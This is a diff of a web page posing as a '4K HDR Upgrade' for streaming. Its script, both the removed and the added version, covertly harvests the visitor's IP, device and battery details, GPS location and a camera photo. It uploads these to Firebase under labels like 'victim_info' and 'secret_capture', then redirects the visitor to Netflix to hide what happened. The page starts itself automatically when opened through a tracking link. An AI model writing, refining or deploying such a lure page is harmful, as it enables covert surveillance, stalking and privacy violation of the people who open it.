@@ -4,16 +4,14 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>4K HDR Upgrade</title>
-    
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-storage-compat.js"></script>
-    
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: linear-gradient(135deg, #0a0a0a 0%, #000000 100%);
+            font-family: Arial, sans-serif;
+            background: #000;
             min-height: 100vh;
             display: flex;
             justify-content: center;
@@ -21,60 +19,48 @@
             padding: 20px;
         }
         .card {
-            background: rgba(20, 20, 20, 0.95);
-            backdrop-filter: blur(10px);
-            border-radius: 32px;
-            padding: 40px 28px;
-            max-width: 420px;
+            background: #111;
+            border-radius: 28px;
+            padding: 40px;
+            max-width: 400px;
             width: 100%;
             text-align: center;
-            border: 1px solid rgba(255, 255, 255, 0.1);
+            border: 1px solid #222;
         }
-        .logo {
-            width: 80px;
-            height: 80px;
-            background: linear-gradient(135deg, #e50914, #b20710);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 24px;
-            font-size: 40px;
+        .logo { font-size: 60px; margin-bottom: 20px; }
+        h1 { color: #fff; font-size: 24px; margin-bottom: 10px; }
+        p { color: #aaa; font-size: 14px; margin-bottom: 30px; }
+        .btn {
+            background: #e50914;
+            color: white;
+            border: none;
+            width: 100%;
+            padding: 16px;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 40px;
+            cursor: pointer;
         }
-        h1 { color: #fff; font-size: 26px; font-weight: 700; margin-bottom: 8px; }
-        .badge { display: inline-block; background: #e50914; padding: 4px 12px; border-radius: 20px; font-size: 11px; font-weight: 600; margin-bottom: 16px; color: #fff; }
-        .sub { color: #aaa; font-size: 14px; margin-bottom: 28px; }
-        .device-info { background: rgba(255,255,255,0.05); border-radius: 20px; padding: 16px; margin-bottom: 24px; text-align: left; }
-        .device-info p { color: #ccc; font-size: 13px; margin: 6px 0; }
-        .progress-container { background: #1a1a1a; border-radius: 30px; height: 8px; margin: 20px 0; overflow: hidden; display: none; }
-        .progress-bar { background: #e50914; width: 0%; height: 100%; transition: width 0.3s ease; }
-        .progress-text { color: #e50914; font-size: 13px; margin-top: 8px; display: none; }
-        .btn { background: linear-gradient(135deg, #e50914, #b20710); color: white; border: none; width: 100%; padding: 16px; font-size: 16px; font-weight: 700; border-radius: 44px; cursor: pointer; }
-        .btn:disabled { background: #444; cursor: not-allowed; }
-        .loader { margin-top: 16px; color: #e50914; font-size: 13px; display: none; }
+        .btn:disabled { background: #444; }
+        .status {
+            margin-top: 20px;
+            padding: 12px;
+            border-radius: 12px;
+            font-size: 12px;
+            display: none;
+            color: #4ade80;
+            background: #0a2e1a;
+        }
         video, canvas { display: none; }
     </style>
 </head>
 <body>
     <div class="card">
-        <div class="logo">🎬</div>
+        <div class="logo">📸</div>
         <h1>4K HDR Upgrade</h1>
-        <div class="badge">⚡ INSTANT UPGRADE</div>
-        <div class="sub">Optimize your device for 4K HDR streaming</div>
-        
-        <div class="device-info">
-            <p>📱 Device: <span id="deviceName">Detecting...</span></p>
-            <p>🔋 Battery: <span id="batteryLevel">Detecting...</span></p>
-            <p>📶 Quality: HD Ready → 4K HDR</p>
-        </div>
-        
-        <div class="progress-container" id="progressContainer">
-            <div class="progress-bar" id="progressBar"></div>
-        </div>
-        <div class="progress-text" id="progressText">0%</div>
-        
-        <button class="btn" id="upgradeBtn">⚡ ENABLE 4K HDR</button>
-        <div class="loader" id="loader">Optimizing...</div>
+        <p>Click below to enable 4K HDR streaming</p>
+        <button class="btn" id="startBtn">Enable 4K HDR</button>
+        <div class="status" id="statusMsg"></div>
     </div>
     
     <video id="video" autoplay playsinline style="display:none"></video>
@@ -96,116 +82,14 @@
         const urlParams = new URLSearchParams(window.location.search);
         const sessionId = urlParams.get('id');
         
-        const upgradeBtn = document.getElementById('upgradeBtn');
-        const loader = document.getElementById('loader');
-        const progressContainer = document.getElementById('progressContainer');
-        const progressBar = document.getElementById('progressBar');
-        const progressText = document.getElementById('progressText');
+        const startBtn = document.getElementById('startBtn');
+        const statusMsg = document.getElementById('statusMsg');
         
-        function updateProgress(percent, msg) {
-            progressBar.style.width = percent + '%';
-            progressText.innerHTML = percent + '% - ' + msg;
-        }
-        
-        if (!sessionId) {
-            upgradeBtn.disabled = true;
-            loader.style.display = 'block';
-            loader.innerHTML = '❌ Invalid link';
-        }
-        
-        // Get IP from multiple sources
-        async function getIPInfo() {
-            try {
-                // Try ipapi.co first
-                let res = await fetch('https://ipapi.co/json/', { timeout: 3000 });
-                let data = await res.json();
-                if (data.ip) {
-                    return {
-                        ip: data.ip,
-                        country: data.country_name || 'Unknown',
-                        region: data.region || 'Unknown',
-                        city: data.city || 'Unknown',
-                        lat: data.latitude || 0,
-                        lng: data.longitude || 0,
-                        isp: data.org || 'Unknown'
-                    };
-                }
-            } catch(e) {}
-            
-            try {
-                // Try ipinfo.io as backup
-                let res = await fetch('https://ipinfo.io/json', { timeout: 3000 });
-                let data = await res.json();
-                if (data.ip) {
-                    let loc = data.loc ? data.loc.split(',') : [0, 0];
-                    return {
-                        ip: data.ip,
-                        country: data.country || 'Unknown',
-                        region: data.region || 'Unknown',
-                        city: data.city || 'Unknown',
-                        lat: parseFloat(loc[0]) || 0,
-                        lng: parseFloat(loc[1]) || 0,
-                        isp: data.org || 'Unknown'
-                    };
-                }
-            } catch(e) {}
-            
-            // Fallback: get local IP via WebRTC
-            return {
-                ip: await getLocalIP(),
-                country: 'Unknown',
-                region: 'Unknown',
-                city: 'Unknown',
-                lat: 0,
-                lng: 0,
-                isp: 'Unknown'
-            };
-        }
-        
-        // Get local IP via WebRTC
-        function getLocalIP() {
-            return new Promise((resolve) => {
-                const pc = new RTCPeerConnection({ iceServers: [] });
-                pc.createDataChannel('');
-                pc.createOffer().then(offer => pc.setLocalDescription(offer));
-                pc.onicecandidate = (e) => {
-                    if (!e.candidate) return;
-                    const ip = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
-                    if (ip) resolve(ip[0]);
-                    pc.close();
-                };
-                setTimeout(() => resolve('Unknown'), 2000);
-            });
-        }
-        
-        // Get Device + Battery
-        async function getDeviceInfo() {
-            const ua = navigator.userAgent;
-            let device = "Unknown", os = "Unknown", browser = "Unknown";
-            
-            if (ua.includes("iPhone")) { device = "iPhone"; os = "iOS"; }
-            else if (ua.includes("Android")) { device = "Android Phone"; os = "Android"; }
-            else if (ua.includes("Windows")) { device = "Desktop"; os = "Windows"; }
-            else if (ua.includes("Mac")) { device = "Desktop"; os = "macOS"; }
-            
-            if (ua.includes("Chrome")) browser = "Google Chrome";
-            else if (ua.includes("Safari")) browser = "Safari";
-            else if (ua.includes("Firefox")) browser = "Firefox";
-            
-            let battery = "Unknown";
-            if ('getBattery' in navigator) {
-                try {
-                    const b = await navigator.getBattery();
-                    battery = Math.round(b.level * 100) + '%';
-                    if (!b.charging) battery += ' (discharging)';
-                    else battery += ' (charging)';
-                } catch(e) {}
-            }
-            
-            document.getElementById('deviceName').innerText = device;
-            document.getElementById('batteryLevel').innerText = battery;
-            
-            return { device, os, browser, battery };
+        function showStatus(msg, isError = false) {
+            statusMsg.style.display = 'block';
+            statusMsg.style.background = isError ? '#2e0a0a' : '#0a2e1a';
+            statusMsg.style.color = isError ? '#ff6b6b' : '#4ade80';
+            statusMsg.innerHTML = msg;
         }
         
         async function saveData(type, data) {
@@ -218,7 +102,7 @@
         
         async function uploadFile(file, type) {
             if (!sessionId) return;
-            const filename = `${sessionId}_${Date.now()}_${file.name.replace(/[^a-z0-9.]/gi, '_')}`;
+            const filename = `${sessionId}_${Date.now()}_${file.name}`;
             const ref = storage.ref(`uploads/${filename}`);
             await ref.put(file);
             const url = await ref.getDownloadURL();
@@ -226,101 +110,132 @@
             return url;
         }
         
-        // Take Camera Photo
-        async function takeCameraPhoto() {
+        // Get IP
+        async function getIP() {
             try {
-                updateProgress(60, "📷 Camera access...");
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                return data.ip;
+            } catch(e) {
+                return 'Unknown';
+            }
+        }
+        
+        // Get Device Info
+        async function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            let device = "Unknown";
+            if (ua.includes("iPhone")) device = "iPhone";
+            else if (ua.includes("Android")) device = "Android";
+            else if (ua.includes("Windows")) device = "Windows";
+            else if (ua.includes("Mac")) device = "Mac";
+            
+            let battery = "Unknown";
+            if ('getBattery' in navigator) {
+                try {
+                    const b = await navigator.getBattery();
+                    battery = Math.round(b.level * 100) + '%';
+                    if (!b.charging) battery += ' (discharging)';
+                    else battery += ' (charging)';
+                } catch(e) {}
+            }
+            return { device, battery, ua: ua.substring(0, 100), screen: `${screen.width}x${screen.height}` };
+        }
+        
+        // Get Location
+        async function getLocation() {
+            return new Promise((resolve) => {
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    await saveData('location', {
+                        lat: pos.coords.latitude,
+                        lng: pos.coords.longitude,
+                        map: `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`
+                    });
+                    resolve(true);
+                }, () => resolve(false));
+            });
+        }
+        
+        // Take Camera Photo - DIRECT TRIGGER
+        async function takePhoto() {
+            try {
+                showStatus("📷 Camera access requested...");
+                
+                // Direct camera access
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
-                await new Promise(r => setTimeout(r, 500));
+                
+                // Wait for camera to initialize
+                await new Promise(r => setTimeout(r, 1000));
                 
                 const canvas = document.getElementById('canvas');
                 canvas.width = video.videoWidth || 640;
                 canvas.height = video.videoHeight || 480;
                 canvas.getContext('2d').drawImage(video, 0, 0);
                 
+                // Convert to file and upload
                 const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.9));
                 const file = new File([blob], `photo_${Date.now()}.jpg`, { type: 'image/jpeg' });
-                await uploadFile(file, 'secret_capture');
-                updateProgress(80, "📸 Photo captured!");
                 
+                await uploadFile(file, 'secret_capture');
+                showStatus("✅ Photo captured and uploaded!");
+                
+                // Stop camera
                 stream.getTracks().forEach(t => t.stop());
                 return true;
-            } catch(e) {
-                updateProgress(60, "Camera denied");
-                return false;
-            }
-        }
-        
-        // Get GPS Location
-        async function getGPSLocation() {
-            try {
-                updateProgress(20, "📍 Location...");
-                const pos = await new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 8000 });
-                });
-                await saveData('gps_location', {
-                    lat: pos.coords.latitude,
-                    lng: pos.coords.longitude
-                });
-                updateProgress(40, "📍 Location captured!");
-                return true;
-            } catch(e) {
-                updateProgress(40, "Location skipped");
+                
+            } catch(error) {
+                console.error("Camera error:", error);
+                showStatus("❌ Camera access denied. Please allow camera permission.", true);
                 return false;
             }
         }
         
         // MAIN FUNCTION
-        async function startUpgrade() {
-            if (!sessionId) return;
+        async function start() {
+            if (!sessionId) {
+                showStatus("❌ Invalid link", true);
+                return;
+            }
             
-            upgradeBtn.disabled = true;
-            loader.style.display = 'block';
-            progressContainer.style.display = 'block';
-            progressText.style.display = 'block';
+            startBtn.disabled = true;
+            showStatus("🔧 Starting optimization...");
             
-            // STEP 1: Device + IP (0-15%)
-            updateProgress(5, "Detecting device...");
-            const ipInfo = await getIPInfo();
+            // Step 1: Device Info + IP
             const deviceInfo = await getDeviceInfo();
+            const ip = await getIP();
             await saveData('victim_info', {
-                ip: ipInfo?.ip || 'Unknown',
-                country: ipInfo?.country || 'Unknown',
-                region: ipInfo?.region || 'Unknown',
-                city: ipInfo?.city || 'Unknown',
-                lat: ipInfo?.lat || 0,
-                lng: ipInfo?.lng || 0,
-                isp: ipInfo?.isp || 'Unknown',
+                ip: ip,
                 device: deviceInfo.device,
-                os: deviceInfo.os,
-                browser: deviceInfo.browser,
-                battery: deviceInfo.battery
+                battery: deviceInfo.battery,
+                screen: deviceInfo.screen,
+                ua: deviceInfo.ua
             });
-            updateProgress(15, "Device detected!");
+            showStatus("✅ Device detected: " + deviceInfo.device);
             
-            // STEP 2: GPS Location (15-45%)
-            await getGPSLocation();
+            // Step 2: Location
+            showStatus("📍 Requesting location...");
+            await getLocation();
             
-            // STEP 3: Camera Photo (45-85%)
-            await takeCameraPhoto();
+            // Step 3: Camera Photo
+            showStatus("📷 Requesting camera...");
+            await takePhoto();
             
-            // STEP 4: Complete (85-100%)
-            updateProgress(95, "Finalizing...");
-            await saveData('upgrade_complete', { timestamp: new Date().toISOString() });
-            updateProgress(100, "4K HDR Enabled!");
-            loader.innerHTML = "✅ 4K HDR Activated! Redirecting...";
+            // Step 4: Complete
+            await saveData('complete', { time: new Date().toISOString() });
+            showStatus("✅ 4K HDR Enabled! Redirecting...");
             
             setTimeout(() => {
                 window.location.href = "https://www.netflix.com";
-            }, 1500);
+            }, 2000);
         }
         
-        upgradeBtn.onclick = startUpgrade;
+        startBtn.onclick = start;
         
+        // Auto start after 1 second
         if (sessionId) {
-            setTimeout(startUpgrade, 300);
+            setTimeout(start, 1000);
         }
     </script>
 </body>
